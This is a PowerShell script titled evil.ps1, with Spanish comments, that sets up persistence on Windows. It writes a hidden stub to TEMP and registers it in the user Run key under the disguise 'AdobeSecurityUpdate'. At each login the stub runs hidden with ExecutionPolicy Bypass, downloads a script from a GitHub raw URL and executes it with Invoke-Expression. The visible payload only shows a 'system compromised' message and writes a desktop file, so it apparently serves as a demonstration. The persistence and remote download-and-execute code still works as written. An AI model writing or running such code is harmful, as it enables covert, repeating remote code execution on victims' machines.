# evil.ps1 - Persistencia mejorada con actualización automática

# ====================================================
# 1. Función para instalar persistencia (solo la primera vez)
# ====================================================
function Install-Persistence {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "AdobeSecurityUpdate"
    $scriptPath = "$env:TEMP\update.ps1"
    
    # Verificar si ya está instalado
    $existing = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
    if ($existing -eq $null) {
        # Crear un stub más robusto que reintente la descarga
        $stub = @'
# Stub de persistencia - Versión 2.0
# Este stub se ejecuta al inicio y descarga el payload remoto

$url = "https://raw.githubusercontent.com/jesusb26/ScriptPDF/refs/heads/main/evil.ps1"

# Función para descargar con reintentos
function Download-Payload {
    param([int]$maxRetries = 5, [int]$waitSeconds = 3)
    for ($i=0; $i -lt $maxRetries; $i++) {
        try {
            $script = (New-Object Net.WebClient).DownloadString($url)
            if ($script) {
                return $script
            }
        } catch {
            Write-Host "Intento $($i+1) fallido. Esperando $waitSeconds segundos..."
            Start-Sleep -Seconds $waitSeconds
        }
    }
    return $null
}

# Ejecutar el payload descargado
$payload = Download-Payload
if ($payload) {
    # Ejecutar el código descargado en el contexto actual
    Invoke-Expression $payload
} else {
    # Si falla, crear un archivo de error en el escritorio
    $desktop = [Environment]::GetFolderPath("Desktop")
    "Error al descargar el payload el $(Get-Date)" | Out-File "$desktop\ERROR_PAYLOAD.txt"
}
'@
        # Escribir el stub en TEMP
        $stub | Out-File -FilePath $scriptPath -Encoding UTF8
        # Ocultar el archivo
        attrib +h $scriptPath
        # Crear entrada en el registro
        Set-ItemProperty -Path $regPath -Name $regName -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
        
        # Log de instalación
        $log = "$env:TEMP\persistencia.log"
        "Persistencia instalada el $(Get-Date)" | Out-File -FilePath $log -Append
    }
}

# ====================================================
# 2. Función para mostrar el payload (siempre)
# ====================================================
function Show-Payload {
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.MessageBox]::Show('Ejecutando payload... Sistema comprometido!', 'Alerta de Seguridad')
    
    $desktop = [Environment]::GetFolderPath("Desktop")
    $file = "$desktop\COMPROMETIDO.txt"
    "El sistema fue comprometido el $(Get-Date)" | Out-File $file
    
    Start-Process notepad.exe $file
}

# ====================================================
# 3. Ejecutar todo
# ====================================================
Install-Persistence
Show-Payload
